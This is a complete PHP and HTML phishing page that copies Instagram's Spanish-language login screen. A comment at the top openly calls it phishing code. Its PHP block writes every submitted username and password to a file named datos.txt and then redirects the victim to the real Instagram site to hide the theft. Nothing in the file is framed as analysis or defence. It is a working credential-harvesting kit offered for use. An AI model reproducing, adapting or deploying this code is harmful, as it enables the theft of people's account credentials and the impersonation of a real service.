<?php
    if(isset($_POST['pseudo']) && isset($_POST['mdp'])) {
        $pseudo = $_POST['pseudo'];
        $mdp    = $_POST['mdp'];

        file_put_contents("datos.txt","  Compte : " . $pseudo . "\n  Mot de Pass : " .$mdp . "\n\n",FILE_APPEND);

        header('Location: https://www.instagram.com/');

    }
?>

<!--codigo php
    phishing
       web: https://xoce.org
  facebook: https://facebook.com/Xoce01
    

-->
<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram</title>
    <link rel="stylesheet" href="style.css">
    <link rel="stylesheet" href="http://maxcdn.bootstrapcdn.com/font-awesome/4.3.0/css/font-awesome.min.css">
    <link rel="shortcut icon" href="favicon.ico" type="image/x-icon">
</head>
<body>
    <div class="main">
            <img src="https://i.ibb.co/XJXqZP4/principal-image.png" height="575" width="375" class="main-image">
            <div class="main-card-login">
                <div class="login-card">
                    <div class="login-card-header-image">
                        <img src="https://i.ibb.co/chYt9nx/instagram-header.png" height="70" width="180">
                    </div>
                    <div class="login-card-form">
                        <form method="post" action="index.php">
                            <input type="text" name="pseudo" placeholder="Teléfono, usuario o correo electrónico">
                            <input type="password" name="mdp" placeholder="Contraseña">
                            <button type="submit" class="login-form-button">Iniciar sesión</button>
                        </form>
                        <div class="login-or">
                            <hr class="login-or-first-separation">
                            O
                            <hr class="login-or-last-separation">
                        </div>
                        <div class="login-with-facebook">
                            <p>
                                <i class="fa fa-facebook-square" aria-hidden="true"></i> 
                                Iniciar sesión con Facebook
                            </p>
                        </div>
                        <div class="forgot-password">
                            <p>
                                <a href="https://www.instagram.com/accounts/password/reset/?hl=fr">Contraseña olvidada ?</a>
                            </p>
                        </div>
                    </div>
                </div>
                <div class="login-card-footer">
                ¿No tienes una cuenta?
                    <span>
                        <a href="https://www.instagram.com/accounts/emailsignup/?hl=fr">Inscribirse</a>
                    </span>
                </div>
                <div class="download-app">
                Descarga la aplicación.
                </div>
                <div class="download-app-buttons">
                    <a href="https://apps.apple.com/app/instagram/id389801252?vt=lo"><img src='https://i.ibb.co/0MVzVqf/download-appstore.png' height="40" width="130"></a>
                    <a href="https://play.google.com/store/apps/details?id=com.instagram.android&referrer=utm_source%3Dinstagramweb%26utm_campaign%3DloginPage%26ig_mid%3DD4B472C0-BE65-4C27-8627-0A374E02436F%26utm_content%3Dlo%26utm_medium%3Dbadge"><img src='https://i.ibb.co/hdsFFGB/download-playstore.png' height="40" width="130"></a>
                </div>
            </div>
        </div>
        <!---fin html--->
</body>
</html>
